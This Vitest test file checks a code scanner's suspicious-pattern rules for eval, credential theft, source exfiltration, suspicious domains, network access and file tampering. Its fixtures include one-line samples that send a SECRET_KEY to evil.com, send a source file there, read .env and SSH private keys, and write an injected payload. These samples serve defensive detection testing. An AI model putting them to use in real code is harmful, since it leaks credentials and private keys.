import { describe, expect, it } from 'vitest';
import { SUSPICIOUS_PATTERNS } from '../src/rules/suspicious-patterns';

function matchesAny(content: string, patternId: string): boolean {
  const pattern = SUSPICIOUS_PATTERNS.find((entry) => entry.id === patternId);
  if (!pattern) throw new Error(`Missing pattern: ${patternId}`);
  return pattern.patterns.some((regex) => {
    regex.lastIndex = 0;
    return regex.test(content);
  });
}

describe('Suspicious pattern false positives', () => {
  it('does not treat a bundled eval helper as dynamic execution', () => {
    expect(matchesAny('const evaluate = (code) => code;', 'dynamic-exec')).toBe(
      false,
    );
    expect(matchesAny('myeval("safe")', 'dynamic-exec')).toBe(false);
  });

  it('still detects real eval usage', () => {
    expect(matchesAny('eval(payload)', 'dynamic-exec')).toBe(true);
    expect(matchesAny('new Function("return 1")', 'dynamic-exec')).toBe(true);
  });

  it('does not flag reading package.json as credential theft', () => {
    const code =
      'const pkg = JSON.parse(fs.readFileSync("package.json", "utf8"));';
    expect(matchesAny(code, 'api-key-steal')).toBe(false);
    expect(matchesAny(code, 'config-exfil')).toBe(false);
  });

  it('still flags reading .env and key files', () => {
    expect(matchesAny('fs.readFileSync(".env", "utf8")', 'api-key-steal')).toBe(
      true,
    );
    expect(
      matchesAny(
        'fs.readFileSync("/home/u/.ssh/id_rsa", "utf8")',
        'config-exfil',
      ),
    ).toBe(true);
  });

  it('does not flag a non-source file read followed by a request', () => {
    const code =
      'const cfg = fs.readFileSync("settings.json", "utf8"); fetch("https://api.example.com")';
    expect(matchesAny(code, 'code-exfil')).toBe(false);
  });

  it('flags reading a source file followed by a request', () => {
    const code =
      'const src = fs.readFileSync("src/app.ts", "utf8"); https.request({ host: "evil.com" })';
    expect(matchesAny(code, 'code-exfil')).toBe(true);
  });

  it('does not flag ordinary env usage followed by a request', () => {
    const code =
      'const port = process.env.PORT; fetch(`http://localhost:${port}/health`);';
    expect(matchesAny(code, 'api-key-steal')).toBe(false);
  });

  it('flags a secret env var followed by a request', () => {
    const code =
      'const key = process.env.SECRET_KEY; fetch("https://evil.com/?k=" + key)';
    expect(matchesAny(code, 'api-key-steal')).toBe(true);
  });

  it('does not flag loopback or private addresses', () => {
    expect(
      matchesAny(
        'const url = "http://127.0.0.1:3000/api";',
        'suspicious-domains',
      ),
    ).toBe(false);
    expect(
      matchesAny(
        'const url = "http://192.168.1.5:8080/dev";',
        'suspicious-domains',
      ),
    ).toBe(false);
    expect(
      matchesAny(
        'const url = "http://172.16.0.4/status";',
        'suspicious-domains',
      ),
    ).toBe(false);
  });

  it('flags public IP destinations', () => {
    expect(
      matchesAny(
        'const url = "http://45.66.77.88/payload";',
        'suspicious-domains',
      ),
    ).toBe(true);
  });

  it('does not flag prefetch as network access', () => {
    expect(matchesAny('prefetch("/assets/app.js")', 'network-access')).toBe(
      false,
    );
    expect(matchesAny('fetch("/api/data")', 'network-access')).toBe(true);
  });

  it('does not flag ordinary file writes as tampering', () => {
    expect(
      matchesAny('fs.writeFileSync("out/result.txt", data)', 'file-mod'),
    ).toBe(false);
    expect(
      matchesAny('fs.writeFileSync("src/injected.js", payload)', 'file-mod'),
    ).toBe(true);
  });
});
